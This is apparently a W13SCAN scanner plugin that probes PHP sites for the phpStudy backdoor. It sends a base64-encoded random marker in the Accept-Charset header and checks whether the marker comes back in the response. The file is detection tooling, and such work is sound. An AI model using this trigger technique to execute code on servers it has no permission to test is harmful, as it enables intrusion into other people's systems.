#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/9/27 10:03 AM
# @Author  : w8ay
# @File    : phpstudy_backdoor.py
import requests

from W13SCAN.lib.common import random_str, md5
from W13SCAN.lib.const import Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase
import base64


class W13SCAN(PluginBase):
    name = 'phpstudy backdoor任意代码执行'
    desc = '''在header头Accept-Charset中执行base64编码的代码'''
    level = Level.MIDDLE

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if self.response.language == "PHP" or self.response.language is None:
            domain = "{}://{}/".format(p.scheme, p.netloc)
            payload = md5(random_str().encode())
            payload2 = base64.b64encode(payload.encode()).decode()
            headers["Accept-Encoding"] = "gzip,deflate"
            headers["Accept-Charset"] = payload2
            r = requests.get(domain, headers=headers)
            if r.status_code == 200 and payload in r.text:
                out.success(payload, self.name, desc=self.desc)
